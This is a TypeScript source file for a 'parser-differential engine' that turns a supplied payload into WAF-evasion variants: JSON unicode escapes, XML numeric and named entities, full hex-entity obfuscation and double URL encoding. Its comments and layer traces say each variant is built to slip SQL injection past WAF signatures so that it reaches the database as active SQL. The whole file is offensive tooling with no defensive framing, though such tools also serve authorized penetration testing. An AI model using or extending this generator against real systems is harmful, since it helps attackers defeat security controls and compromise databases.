/**
 * SENTINEL — Multi-Tier Parser-Differential Engine
 *
 * Models the 10-tier request-processing pipeline:
 * CLIENT -> CDN -> WAF -> REVERSE PROXY -> WEB SERVER -> DESERIALIZER -> APPLICATION -> ORM -> DRIVER -> DATABASE
 *
 * Explicitly tracks representation deltas across layers to exploit serialization
 * and normalization impedance mismatches (e.g. JSON Unicode escapes, XML entities, HPP).
 */

export type PipelineLayer =
  | 'CLIENT'
  | 'CDN'
  | 'WAF'
  | 'REVERSE_PROXY'
  | 'WEB_SERVER'
  | 'DESERIALIZER'
  | 'APPLICATION'
  | 'ORM'
  | 'DRIVER'
  | 'DATABASE';

export type TransformationEncoding =
  | 'RAW'
  | 'URL_ENCODED'
  | 'DOUBLE_URL_ENCODED'
  | 'JSON_UNICODE_ESCAPE'
  | 'XML_NUMERIC_ENTITY'
  | 'XML_NAMED_ENTITY'
  | 'MULTIPART_ANOMALY'
  | 'HEADER_FOLDING'
  | 'COMMENT_FRAGMENTATION';

export interface LayerInterpretationDelta {
  layer: PipelineLayer;
  representationBefore: string;
  representationAfter: string;
  encoding: TransformationEncoding;
  normalizationMechanism: string;
  expectedInterpretation: string;
  downstreamPassThrough: boolean;
}

export interface DifferentialTransformationCandidate {
  id: string;
  name: string;
  targetLayers: PipelineLayer[];
  encoding: TransformationEncoding;
  originalPayload: string;
  transformedWirePayload: string;
  layerTrace: LayerInterpretationDelta[];
  compatibility: {
    transportFormats: ('query' | 'body_json' | 'body_xml' | 'body_multipart' | 'header' | 'cookie')[];
    minWafResistanceScore: number; // 0-100
  };
}

export class ParserDifferentialModel {
  /**
   * Generates serialization-differential candidates that exploit impedance mismatches
   * between perimeter inspect-layers (WAF/CDN) and backend execution layers (App/DB).
   */
  public static generateDifferentialCandidates(
    payload: string,
    transportFormat: 'query' | 'body_json' | 'body_xml' | 'body_multipart' | 'header' | 'cookie'
  ): DifferentialTransformationCandidate[] {
    const candidates: DifferentialTransformationCandidate[] = [];

    // 1. JSON Unicode Escape Sequences (\u0027 for single quote, \u0022 for double quote)
    if (transportFormat === 'body_json') {
      const jsonUnicode = payload
        .replace(/'/g, '\\u0027')
        .replace(/"/g, '\\u0022')
        .replace(/=/g, '\\u003d')
        .replace(/ /g, '\\u0020');

      candidates.push({
        id: 'DIFF_JSON_UNICODE_ESCAPE',
        name: 'JSON Unicode Code-Point Escape',
        targetLayers: ['WAF', 'DESERIALIZER', 'APPLICATION'],
        encoding: 'JSON_UNICODE_ESCAPE',
        originalPayload: payload,
        transformedWirePayload: jsonUnicode,
        layerTrace: [
          {
            layer: 'WAF',
            representationBefore: jsonUnicode,
            representationAfter: jsonUnicode,
            encoding: 'JSON_UNICODE_ESCAPE',
            normalizationMechanism: 'Raw regex matching on ASCII token boundaries (misses \\uXXXX)',
            expectedInterpretation: 'Escaped string literal without raw quotation delimiters',
            downstreamPassThrough: true,
          },
          {
            layer: 'DESERIALIZER',
            representationBefore: jsonUnicode,
            representationAfter: payload,
            encoding: 'RAW',
            normalizationMechanism: 'RFC 8259 Standard JSON.parse() Unicode unescaping',
            expectedInterpretation: 'Decoded SQL string containing active punctuation',
            downstreamPassThrough: true,
          },
          {
            layer: 'DATABASE',
            representationBefore: payload,
            representationAfter: payload,
            encoding: 'RAW',
            normalizationMechanism: 'Direct SQL AST parsing',
            expectedInterpretation: 'Syntactically active SQL statement',
            downstreamPassThrough: true,
          },
        ],
        compatibility: {
          transportFormats: ['body_json'],
          minWafResistanceScore: 85,
        },
      });
    }

    // 2. XML Character Entity References (&#x27;, &apos;)
    if (transportFormat === 'body_xml') {
      const xmlEntity = payload
        .replace(/'/g, '&#x27;')
        .replace(/"/g, '&quot;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');

      candidates.push({
        id: 'DIFF_XML_NUMERIC_ENTITY',
        name: 'XML Hexadecimal Numeric Entity Reference',
        targetLayers: ['WAF', 'DESERIALIZER', 'APPLICATION'],
        encoding: 'XML_NUMERIC_ENTITY',
        originalPayload: payload,
        transformedWirePayload: xmlEntity,
        layerTrace: [
          {
            layer: 'WAF',
            representationBefore: xmlEntity,
            representationAfter: xmlEntity,
            encoding: 'XML_NUMERIC_ENTITY',
            normalizationMechanism: 'Signature match fails on &#x27; vs single quote',
            expectedInterpretation: 'Character data payload without SQL delimiters',
            downstreamPassThrough: true,
          },
          {
            layer: 'DESERIALIZER',
            representationBefore: xmlEntity,
            representationAfter: payload,
            encoding: 'RAW',
            normalizationMechanism: 'XML Entity reference substitution in DOM parser',
            expectedInterpretation: 'Decoded string containing raw SQL tokens',
            downstreamPassThrough: true,
          },
          {
            layer: 'DATABASE',
            representationBefore: payload,
            representationAfter: payload,
            encoding: 'RAW',
            normalizationMechanism: 'Direct query execution',
            expectedInterpretation: 'Unescaped SQL injection syntax',
            downstreamPassThrough: true,
          },
        ],
        compatibility: {
          transportFormats: ['body_xml'],
          minWafResistanceScore: 90,
        },
      });

      // Full XML Hexadecimal Entity Obfuscation (Hackvertor hex_entities equivalent for WAF evasion)
      const fullHexEntity = payload
        .split('')
        .map((c) => {
          if (c === ' ' || c === '\n' || c === '\r') return c;
          return `&#x${c.charCodeAt(0).toString(16)};`;
        })
        .join('');

      candidates.push({
        id: 'DIFF_XML_FULL_HEX_ENTITY',
        name: 'Full XML Numeric Character Reference (NCR) Obfuscation',
        targetLayers: ['WAF', 'DESERIALIZER', 'APPLICATION'],
        encoding: 'XML_NUMERIC_ENTITY',
        originalPayload: payload,
        transformedWirePayload: fullHexEntity,
        layerTrace: [
          {
            layer: 'WAF',
            representationBefore: fullHexEntity,
            representationAfter: fullHexEntity,
            encoding: 'XML_NUMERIC_ENTITY',
            normalizationMechanism: 'WAF regex fails to match literal SQL keywords in hex entity format',
            expectedInterpretation: 'Character data payload without SQL delimiters or keywords',
            downstreamPassThrough: true,
          },
          {
            layer: 'DESERIALIZER',
            representationBefore: fullHexEntity,
            representationAfter: payload,
            encoding: 'RAW',
            normalizationMechanism: 'XML Entity reference substitution in DOM/SAX parser',
            expectedInterpretation: 'Decoded string containing raw SQL tokens',
            downstreamPassThrough: true,
          },
          {
            layer: 'DATABASE',
            representationBefore: payload,
            representationAfter: payload,
            encoding: 'RAW',
            normalizationMechanism: 'Direct query execution',
            expectedInterpretation: 'Unescaped SQL injection syntax',
            downstreamPassThrough: true,
          },
        ],
        compatibility: {
          transportFormats: ['body_xml'],
          minWafResistanceScore: 98,
        },
      });
    }

    // 3. Double-URL Encoding for Proxies that decode path/query components once
    if (transportFormat === 'query' || transportFormat === 'header' || transportFormat === 'cookie') {
      const fullUrlEncode = (str: string) =>
        encodeURIComponent(str).replace(/'/g, '%27').replace(/\(/g, '%28').replace(/\)/g, '%29').replace(/\*/g, '%2A');
      const doubleEncoded = fullUrlEncode(fullUrlEncode(payload));

      candidates.push({
        id: 'DIFF_DOUBLE_URL_ENCODING',
        name: 'Double URL Hex Encoding (%2527 for %27)',
        targetLayers: ['REVERSE_PROXY', 'WEB_SERVER', 'APPLICATION'],
        encoding: 'DOUBLE_URL_ENCODED',
        originalPayload: payload,
        transformedWirePayload: doubleEncoded,
        layerTrace: [
          {
            layer: 'REVERSE_PROXY',
            representationBefore: doubleEncoded,
            representationAfter: encodeURIComponent(payload),
            encoding: 'URL_ENCODED',
            normalizationMechanism: 'First-hop URL path/query decoding step',
            expectedInterpretation: 'Single URL encoded string (%27)',
            downstreamPassThrough: true,
          },
          {
            layer: 'APPLICATION',
            representationBefore: encodeURIComponent(payload),
            representationAfter: payload,
            encoding: 'RAW',
            normalizationMechanism: 'Framework parameter decoding (e.g. Express/Spring)',
            expectedInterpretation: 'Decoded SQL payload',
            downstreamPassThrough: true,
          },
          {
            layer: 'DATABASE',
            representationBefore: payload,
            representationAfter: payload,
            encoding: 'RAW',
            normalizationMechanism: 'SQL grammar tokenizer',
            expectedInterpretation: 'Active relational statement',
            downstreamPassThrough: true,
          },
        ],
        compatibility: {
          transportFormats: ['query', 'header', 'cookie'],
          minWafResistanceScore: 75,
        },
      });
    }

    return candidates;
  }
}